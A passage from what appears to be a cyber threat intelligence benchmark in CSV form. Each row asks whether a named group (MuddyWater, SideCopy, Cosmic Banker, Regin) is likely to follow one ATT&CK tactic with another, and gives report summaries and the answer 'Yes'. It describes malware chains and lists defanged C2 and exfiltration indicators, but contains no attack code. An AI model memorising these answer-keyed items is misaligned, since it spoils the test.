Others: The MuddyWater group impersonates entities in countries surrounding Iran, including Kurdish groups, governmental actors in Iraq, Tajikistan, Pakistan, India, the UAE, and Cyprus. They have used documents resembling official documents from the regional government of Kurdistan and unofficial documents from countries surrounding Iran. The group's combined attack vector leverages CVE-2017-0199 and sends requests to a hacked server to download a JPG file containing a malicious macro. The documents used in the campaign can be categorized into two groups: those resembling previous documents used by MuddyWater and those written in English disguised as unofficial documents from countries surrounding Iran.",Yes,Clearsky-Iranian-APT-group-‘MuddyWater’-Adds-Exploits-to-Their-Arsenal
2243,380,380-Command and Control-T1132-Data Encoding,"After MuddyWater uses decoy documents exploiting CVE-2017-0199 for Initial Access, is it likely that the group will use a RAT file to communicate with the IP address 185.244.149[.]218 for Command and Control by sending encoded base64 output about processes running on the system?","Command and Control: MuddyWater's recent campaign has seen the use of compromised servers to host malicious code for the second stage of attacks. The group has been identified using servers in countries they target, such as a server in Pakistan (hxxp://corplink[.]com[.]pk/wp-content/themes/buisson/16433.jpg) and a server in China (hxxps://bbs[.]kafan[.]cn/thread-2150909-1-1.html). Additionally, a RAT file communicating with the IP address 185.244.149[.]218 was discovered, which sends encoded base64 output to the attacker about processes running on the compromised system.","Initial Access: The Iranian APT group MuddyWater, also known as SeedWorm/Temp.Zagros, has been observed using two attack vectors to target governmental entities and the telecommunication sector. The first vector involves decoy documents exploiting CVE-2017-0199, a Microsoft Office vulnerability that allows remote attackers to execute arbitrary code. The second vector includes communication with compromised C2 servers to download files infected with macros. Notably, MuddyWater has not previously used CVE-2017-0199, which was associated with another Iranian group named OilRig.
Others: The MuddyWater group impersonates entities in countries surrounding Iran, including Kurdish groups, governmental actors in Iraq, Tajikistan, Pakistan, India, the UAE, and Cyprus. They have used documents resembling official documents from the regional government of Kurdistan and unofficial documents from countries surrounding Iran. The group's combined attack vector leverages CVE-2017-0199 and sends requests to a hacked server to download a JPG file containing a malicious macro. The documents used in the campaign can be categorized into two groups: those resembling previous documents used by MuddyWater and those written in English disguised as unofficial documents from countries surrounding Iran.",Yes,Clearsky-Iranian-APT-group-‘MuddyWater’-Adds-Exploits-to-Their-Arsenal
2247,381,381-Credential Access-T1111-Multi-Factor Authentication Interception,"Before targeting Kavach, a multi-factor authentication (MFA) app used by the Government of India, is SideCopy likely to execute infection chains involving malicious LNK files, HTAs, and loader DLLs to deliver final payloads and establish initial access to victim systems?","Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",Yes,SideCopy
2253,381,381-Exfiltration-T1020-Automated Exfiltration,Is it likely that SideCopy would specifically target access credentials from Indian government employees during Credential Access using njRAT before using GoLang-based file recon plugins to exfiltrate Kavach authentication databases during Exfiltration?,"Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.
Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",Yes,SideCopy
2255,381,381-Reconnaissance-T1589-Gather Victim Identity Information,"After deploying themes predominantly designed to target military personnel through decoys and honeytraps, is it likely that SideCopy APT will target government personnel in India to gather victim identity information before mimicking legitimate infection chains of Sidewinder APT to develop their own malware for espionage?","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.","Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.
Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",Yes,SideCopy
2257,382,382-Initial Access-T1566-Phishing,"After the delivery of the COMPROBANTE FISCAL.zip file via a phishing email impersonating Mexico's tax department (SAT) in the Initial Access phase, is it likely that the attack will proceed to execute a PowerShell script from the Internet to run at memory level before ensuring persistence via startup folder shortcuts and scheduled tasks?","Initial Access: The attack begins with an email impersonating Mexico's tax department, Servicio de Administraci\u00f3n Tributaria (SAT), warning of a pending tax return. The email includes a link to download a malicious attachment, COMPROBANTE FISCAL.zip, containing the malicious file COMPROBANTE FISCAL.bat and a folder with the legitimate file GoogleUpdate.exe and another .bat file with the same content as COMPROBANTE FISCAL.bat. Clicking either .bat file triggers the attack.","Reconnaissance: SCILabs identified a new Cosmic Banker attack that matches with previous attacks observed since March 2019. The campaign targets user credentials of Mexican banking institutions and is linked to another campaign targeting users from Brazil's banking institutions. The final phase executable contains specific Portuguese comments also spotted in other reported events, suggesting a link with the Banload malware, which affected banks in Brazil. The reuse of this malware left behind common traces that facilitate the attribution of this campaign to the Brazilian attackers.
Execution: The COMPROBANTE FISCAL.bat file includes a batch programming script that executes a PowerShell script from the Internet to run at memory level. The script downloads the file md.zip, which includes the main malware library DLL, the executable loader part of the Autolt toolkit, and other services. The script also creates a random variable and a folder in %Public%, extracts files from md.zip, renames them, and creates a file with specific contents.
Persistence: The PowerShell script includes base64 coded text strings associated with startup persistence features, such as creating shortcuts in the startup folder and manipulating scheduled tasks.
Defense Evasion: The main malicious file 12.dll, renamed to a random name with the .LNS extension and saved in the %Public% folder, is protected with the VMProtect packer, which makes static analysis difficult. The malware also includes the use of the VMProtect packer to make analysis harder in recent months.
Credential Access: The malware aims to steal bank credentials from Mexican financial institution users by displaying text related to an alleged data update request. It also accesses Outlook info to collect email accounts from the contacts list, which could be used to send emails, impersonating the victim in Business Email Compromise (BEC) attacks.
Collection: The malware accesses Microsoft Outlook MAPI to try to access contacts' email accounts and sends them to the cyber actors through a POST web request.
Command and Control: The PowerShell script communicates with the following domains to download the malware and send collected data: h1m2en.ddns.net and dgi1b2n3m4.ddns.net.
Exfiltration: The collected email accounts are exfiltrated to the cyber actors through a POST web request to the resource hxxp://dgi1b2n3m4.ddns.net/lists/kk/index.php?list.
Others: SCILabs created a YARA rule to identify files that might belong to the same Cosmic Banker campaign. Additional malware was found in a private source with the YARA rule, including 14 additional compressed files named md.zip and a file named Java_qeyghf8_V.zip containing the pp.png file. The malware detection rate fluctuates from 9 to 27 antivirus search engines, making the detection rate a little low.",Yes,Cosmic Banker campaign is still active revealing link with Banload malware
2258,382,382-Execution-T1059-Command and Scripting Interpreter,"After the Cosmic Banker attack uses an email impersonating Mexico's tax department to deliver malicious attachments and gain initial access, is it likely that the COMPROBANTE FISCAL.bat file will execute a PowerShell script before establishing persistence by creating shortcuts in the startup folder and manipulating scheduled tasks?","Execution: The COMPROBANTE FISCAL.bat file includes a batch programming script that executes a PowerShell script from the Internet to run at memory level. The script downloads the file md.zip, which includes the main malware library DLL, the executable loader part of the Autolt toolkit, and other services. The script also creates a random variable and a folder in %Public%, extracts files from md.zip, renames them, and creates a file with specific contents.","Reconnaissance: SCILabs identified a new Cosmic Banker attack that matches with previous attacks observed since March 2019. The campaign targets user credentials of Mexican banking institutions and is linked to another campaign targeting users from Brazil's banking institutions. The final phase executable contains specific Portuguese comments also spotted in other reported events, suggesting a link with the Banload malware, which affected banks in Brazil. The reuse of this malware left behind common traces that facilitate the attribution of this campaign to the Brazilian attackers.
Initial Access: The attack begins with an email impersonating Mexico's tax department, Servicio de Administraci\u00f3n Tributaria (SAT), warning of a pending tax return. The email includes a link to download a malicious attachment, COMPROBANTE FISCAL.zip, containing the malicious file COMPROBANTE FISCAL.bat and a folder with the legitimate file GoogleUpdate.exe and another .bat file with the same content as COMPROBANTE FISCAL.bat. Clicking either .bat file triggers the attack.
Persistence: The PowerShell script includes base64 coded text strings associated with startup persistence features, such as creating shortcuts in the startup folder and manipulating scheduled tasks.
Defense Evasion: The main malicious file 12.dll, renamed to a random name with the .LNS extension and saved in the %Public% folder, is protected with the VMProtect packer, which makes static analysis difficult. The malware also includes the use of the VMProtect packer to make analysis harder in recent months.
Credential Access: The malware aims to steal bank credentials from Mexican financial institution users by displaying text related to an alleged data update request. It also accesses Outlook info to collect email accounts from the contacts list, which could be used to send emails, impersonating the victim in Business Email Compromise (BEC) attacks.
Collection: The malware accesses Microsoft Outlook MAPI to try to access contacts' email accounts and sends them to the cyber actors through a POST web request.
Command and Control: The PowerShell script communicates with the following domains to download the malware and send collected data: h1m2en.ddns.net and dgi1b2n3m4.ddns.net.
Exfiltration: The collected email accounts are exfiltrated to the cyber actors through a POST web request to the resource hxxp://dgi1b2n3m4.ddns.net/lists/kk/index.php?list.
Others: SCILabs created a YARA rule to identify files that might belong to the same Cosmic Banker campaign. Additional malware was found in a private source with the YARA rule, including 14 additional compressed files named md.zip and a file named Java_qeyghf8_V.zip containing the pp.png file. The malware detection rate fluctuates from 9 to 27 antivirus search engines, making the detection rate a little low.",Yes,Cosmic Banker campaign is still active revealing link with Banload malware
2260,382,382-Defense Evasion-T1036-Masquerading,"After COMPROBANTE FISCAL.bat executes a PowerShell script to download and extract malware components into the %Public% folder during the execution phase, is the main malicious file 12.dll likely to be renamed to a random name with the .LNS extension under the %Public% folder for defense evasion before the PowerShell script communicates with command and control domains to download the malware and send collected data?","Defense Evasion: The main malicious file 12.dll, renamed to a random name with the .LNS extension and saved in the %Public% folder, is protected with the VMProtect packer, which makes static analysis difficult. The malware also includes the use of the VMProtect packer to make analysis harder in recent months.","Reconnaissance: SCILabs identified a new Cosmic Banker attack that matches with previous attacks observed since March 2019. The campaign targets user credentials of Mexican banking institutions and is linked to another campaign targeting users from Brazil's banking institutions. The final phase executable contains specific Portuguese comments also spotted in other reported events, suggesting a link with the Banload malware, which affected banks in Brazil. The reuse of this malware left behind common traces that facilitate the attribution of this campaign to the Brazilian attackers.
Initial Access: The attack begins with an email impersonating Mexico's tax department, Servicio de Administraci\u00f3n Tributaria (SAT), warning of a pending tax return. The email includes a link to download a malicious attachment, COMPROBANTE FISCAL.zip, containing the malicious file COMPROBANTE FISCAL.bat and a folder with the legitimate file GoogleUpdate.exe and another .bat file with the same content as COMPROBANTE FISCAL.bat. Clicking either .bat file triggers the attack.
Execution: The COMPROBANTE FISCAL.bat file includes a batch programming script that executes a PowerShell script from the Internet to run at memory level. The script downloads the file md.zip, which includes the main malware library DLL, the executable loader part of the Autolt toolkit, and other services. The script also creates a random variable and a folder in %Public%, extracts files from md.zip, renames them, and creates a file with specific contents.
Persistence: The PowerShell script includes base64 coded text strings associated with startup persistence features, such as creating shortcuts in the startup folder and manipulating scheduled tasks.
Credential Access: The malware aims to steal bank credentials from Mexican financial institution users by displaying text related to an alleged data update request. It also accesses Outlook info to collect email accounts from the contacts list, which could be used to send emails, impersonating the victim in Business Email Compromise (BEC) attacks.
Collection: The malware accesses Microsoft Outlook MAPI to try to access contacts' email accounts and sends them to the cyber actors through a POST web request.
Command and Control: The PowerShell script communicates with the following domains to download the malware and send collected data: h1m2en.ddns.net and dgi1b2n3m4.ddns.net.
Exfiltration: The collected email accounts are exfiltrated to the cyber actors through a POST web request to the resource hxxp://dgi1b2n3m4.ddns.net/lists/kk/index.php?list.
Others: SCILabs created a YARA rule to identify files that might belong to the same Cosmic Banker campaign. Additional malware was found in a private source with the YARA rule, including 14 additional compressed files named md.zip and a file named Java_qeyghf8_V.zip containing the pp.png file. The malware detection rate fluctuates from 9 to 27 antivirus search engines, making the detection rate a little low.",Yes,Cosmic Banker campaign is still active revealing link with Banload malware
2262,382,382-Credential Access-T1056-Input Capture,"After executing a malicious batch file to run a PowerShell script at memory level and enabling persistence through creating shortcuts and manipulating scheduled tasks, is the Cosmic Banker malware likely to target Mexican financial institution users to steal credentials by displaying text related to an alleged data update request before accessing victim's Outlook information to collect email accounts?","Credential Access: The malware aims to steal bank credentials from Mexican financial institution users by displaying text related to an alleged data update request. It also accesses Outlook info to collect email accounts from the contacts list, which could be used to send emails, impersonating the victim in Business Email Compromise (BEC) attacks.","Reconnaissance: SCILabs identified a new Cosmic Banker attack that matches with previous attacks observed since March 2019. The campaign targets user credentials of Mexican banking institutions and is linked to another campaign targeting users from Brazil's banking institutions. The final phase executable contains specific Portuguese comments also spotted in other reported events, suggesting a link with the Banload malware, which affected banks in Brazil. The reuse of this malware left behind common traces that facilitate the attribution of this campaign to the Brazilian attackers.
Initial Access: The attack begins with an email impersonating Mexico's tax department, Servicio de Administraci\u00f3n Tributaria (SAT), warning of a pending tax return. The email includes a link to download a malicious attachment, COMPROBANTE FISCAL.zip, containing the malicious file COMPROBANTE FISCAL.bat and a folder with the legitimate file GoogleUpdate.exe and another .bat file with the same content as COMPROBANTE FISCAL.bat. Clicking either .bat file triggers the attack.
Execution: The COMPROBANTE FISCAL.bat file includes a batch programming script that executes a PowerShell script from the Internet to run at memory level. The script downloads the file md.zip, which includes the main malware library DLL, the executable loader part of the Autolt toolkit, and other services. The script also creates a random variable and a folder in %Public%, extracts files from md.zip, renames them, and creates a file with specific contents.
Persistence: The PowerShell script includes base64 coded text strings associated with startup persistence features, such as creating shortcuts in the startup folder and manipulating scheduled tasks.
Defense Evasion: The main malicious file 12.dll, renamed to a random name with the .LNS extension and saved in the %Public% folder, is protected with the VMProtect packer, which makes static analysis difficult. The malware also includes the use of the VMProtect packer to make analysis harder in recent months.
Collection: The malware accesses Microsoft Outlook MAPI to try to access contacts' email accounts and sends them to the cyber actors through a POST web request.
Command and Control: The PowerShell script communicates with the following domains to download the malware and send collected data: h1m2en.ddns.net and dgi1b2n3m4.ddns.net.
Exfiltration: The collected email accounts are exfiltrated to the cyber actors through a POST web request to the resource hxxp://dgi1b2n3m4.ddns.net/lists/kk/index.php?list.
Others: SCILabs created a YARA rule to identify files that might belong to the same Cosmic Banker campaign. Additional malware was found in a private source with the YARA rule, including 14 additional compressed files named md.zip and a file named Java_qeyghf8_V.zip containing the pp.png file. The malware detection rate fluctuates from 9 to 27 antivirus search engines, making the detection rate a little low.",Yes,Cosmic Banker campaign is still active revealing link with Banload malware
2266,382,382-Exfiltration-T1567-Exfiltration Over Web Service,"After accessing Microsoft Outlook MAPI to collect email accounts from contacts and sending them through a POST web request, is it likely that the collected email accounts will be exfiltrated to cyber actors using the domain dgi1b2n3m4.ddns.net?",Exfiltration: The collected email accounts are exfiltrated to the cyber actors through a POST web request to the resource hxxp://dgi1b2n3m4.ddns.net/lists/kk/index.php?list.,"Reconnaissance: SCILabs identified a new Cosmic Banker attack that matches with previous attacks observed since March 2019. The campaign targets user credentials of Mexican banking institutions and is linked to another campaign targeting users from Brazil's banking institutions. The final phase executable contains specific Portuguese comments also spotted in other reported events, suggesting a link with the Banload malware, which affected banks in Brazil. The reuse of this malware left behind common traces that facilitate the attribution of this campaign to the Brazilian attackers.
Initial Access: The attack begins with an email impersonating Mexico's tax department, Servicio de Administraci\u00f3n Tributaria (SAT), warning of a pending tax return. The email includes a link to download a malicious attachment, COMPROBANTE FISCAL.zip, containing the malicious file COMPROBANTE FISCAL.bat and a folder with the legitimate file GoogleUpdate.exe and another .bat file with the same content as COMPROBANTE FISCAL.bat. Clicking either .bat file triggers the attack.
Execution: The COMPROBANTE FISCAL.bat file includes a batch programming script that executes a PowerShell script from the Internet to run at memory level. The script downloads the file md.zip, which includes the main malware library DLL, the executable loader part of the Autolt toolkit, and other services. The script also creates a random variable and a folder in %Public%, extracts files from md.zip, renames them, and creates a file with specific contents.
Persistence: The PowerShell script includes base64 coded text strings associated with startup persistence features, such as creating shortcuts in the startup folder and manipulating scheduled tasks.
Defense Evasion: The main malicious file 12.dll, renamed to a random name with the .LNS extension and saved in the %Public% folder, is protected with the VMProtect packer, which makes static analysis difficult. The malware also includes the use of the VMProtect packer to make analysis harder in recent months.
Credential Access: The malware aims to steal bank credentials from Mexican financial institution users by displaying text related to an alleged data update request. It also accesses Outlook info to collect email accounts from the contacts list, which could be used to send emails, impersonating the victim in Business Email Compromise (BEC) attacks.
Collection: The malware accesses Microsoft Outlook MAPI to try to access contacts' email accounts and sends them to the cyber actors through a POST web request.
Command and Control: The PowerShell script communicates with the following domains to download the malware and send collected data: h1m2en.ddns.net and dgi1b2n3m4.ddns.net.
Others: SCILabs created a YARA rule to identify files that might belong to the same Cosmic Banker campaign. Additional malware was found in a private source with the YARA rule, including 14 additional compressed files named md.zip and a file named Java_qeyghf8_V.zip containing the pp.png file. The malware detection rate fluctuates from 9 to 27 antivirus search engines, making the detection rate a little low.",Yes,Cosmic Banker campaign is still active revealing link with Banload malware
2267,383,383-Defense Evasion-T1027-Obfuscated Files or Information,"Is it likely that Regin will pass through multiple execution stages, such as loading a kernel driver for Stage 2 and running a kernel-mode DLL in Stage 3 before employing advanced techniques like storing encrypted data blobs in the registry and extended attributes for defense evasion?","Defense Evasion: Regin employs advanced techniques to conceal itself and its activities on compromised computers. It uses encrypted data blobs stored in non-traditional file storage areas such as the registry, extended attributes, or raw sectors at the end of the disk. The threat's stealth combines many advanced techniques to remain under the radar, making analysis difficult as all components must be available to fully understand it.","Initial Access: The CTI report by Symantec Security Response identifies Regin as a sophisticated multi-staged modular threat, with the initial stage (Stage 1) involving the installation and configuration of the threat's internal services. The report, however, does not provide a specific infection vector, stating that it varies among targets and is unconfirmed at the time of writing. It suggests that targets may be tricked into visiting spoofed versions of well-known websites, and the threat may be installed through a web browser or by exploiting an application. In one instance, Regin was observed originating from Yahoo! Instant Messenger through an unconfirmed exploit.
Execution: Regin's execution process is detailed through its multi-staged architecture, which includes six stages. Stage 0, the dropper, is responsible for installing Regin onto the target computer. Stage 1 involves loading a kernel driver that executes Stage 2. Stage 2 is another kernel driver that extracts, installs, and runs Stage 3. Stage 3, a kernel mode DLL, provides a framework for higher-level stages and loads Stage 4. Stage 4 consists of a user-mode orchestrator and multiple kernel payload modules, which are stored in encrypted virtual file system (EVFS) containers. Stage 5 brings into play the main Regin payload functionality, with files injected into services.exe by Stage 4.
Persistence: The CTI report does not provide explicit details on the persistence mechanisms used by Regin, but the multi-staged architecture and the use of kernel drivers and EVFS containers suggest that Regin is designed to maintain a long-term presence on infected systems.
Credential Access: Regin is capable of stealing passwords and monitoring network traffic, which may include credential information. It can also scan for deleted files on an infected computer and retrieve them. Specific modules within Regin are designed to steal passwords, such as those for Windows Explorer credentials and Internet Explorer LegacySettings.
Discovery: Regin's discovery capabilities include gathering information on processes and memory utilization, scanning for deleted files, and retrieving them. It can also monitor network traffic to Microsoft Internet Information Services (IIS) web servers and collect administration traffic for mobile telephony base station controllers.
Collection: Regin's collection capabilities are extensive, including several remote access Trojan (RAT) features such as capturing screenshots and taking control of the mouse's point-and-click functions. It can also gather computer information, steal passwords, monitor network traffic, and crawl through the file system. Advanced payload modules are designed to sniff low-level network traffic and exfiltrate data through various channels.
Command and Control: Regin's command-and-control (C&C) operations are extensive and bidirectional, allowing attackers to initiate communications with compromised computers or vice versa. Compromised computers can serve as a proxy for other infections, and C&C can happen in a peer-to-peer fashion. All communications are strongly encrypted and can use transport protocols such as ICMP, UDP, TCP, and HTTP. The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage 5 payloads, such as C375h and 1Bh.
Exfiltration: Regin's exfiltration capabilities include encoding and embedding payload information within cookie data under various names for HTTP-based C&C. It can also exfiltrate data through channels like TCP, UDP, ICMP, and HTTP. The threat logs data to the ApplicationLog.dat file, which is encrypted and compressed.",Yes,regin-analysis
2275,383,383-Discovery-T1083-File and Directory Discovery,"After using its Command-and-Control (C&C) capabilities with modules like C375h and 1Bh to manage communications and compromised systems, is Regin likely to leverage its file and directory discovery feature to scan for deleted files during the process of gathering operational intelligence for Collection?","Discovery: Regin's discovery capabilities include gathering information on processes and memory utilization, scanning for deleted files, and retrieving them. It can also monitor network traffic to Microsoft Internet Information Services (IIS) web servers and collect administration traffic for mobile telephony base station controllers.","Initial Access: The CTI report by Symantec Security Response identifies Regin as a sophisticated multi-staged modular threat, with the initial stage (Stage 1) involving the installation and configuration of the threat's internal services. The report, however, does not provide a specific infection vector, stating that it varies among targets and is unconfirmed at the time of writing. It suggests that targets may be tricked into visiting spoofed versions of well-known websites, and the threat may be installed through a web browser or by exploiting an application. In one instance, Regin was observed originating from Yahoo! Instant Messenger through an unconfirmed exploit.
Execution: Regin's execution process is detailed through its multi-staged architecture, which includes six stages. Stage 0, the dropper, is responsible for installing Regin onto the target computer. Stage 1 involves loading a kernel driver that executes Stage 2. Stage 2 is another kernel driver that extracts, installs, and runs Stage 3. Stage 3, a kernel mode DLL, provides a framework for higher-level stages and loads Stage 4. Stage 4 consists of a user-mode orchestrator and multiple kernel payload modules, which are stored in encrypted virtual file system (EVFS) containers. Stage 5 brings into play the main Regin payload functionality, with files injected into services.exe by Stage 4.
Persistence: The CTI report does not provide explicit details on the persistence mechanisms used by Regin, but the multi-staged architecture and the use of kernel drivers and EVFS containers suggest that Regin is designed to maintain a long-term presence on infected systems.
Defense Evasion: Regin employs advanced techniques to conceal itself and its activities on compromised computers. It uses encrypted data blobs stored in non-traditional file storage areas such as the registry, extended attributes, or raw sectors at the end of the disk. The threat's stealth combines many advanced techniques to remain under the radar, making analysis difficult as all components must be available to fully understand it.
Credential Access: Regin is capable of stealing passwords and monitoring network traffic, which may include credential information. It can also scan for deleted files on an infected computer and retrieve them. Specific modules within Regin are designed to steal passwords, such as those for Windows Explorer credentials and Internet Explorer LegacySettings.
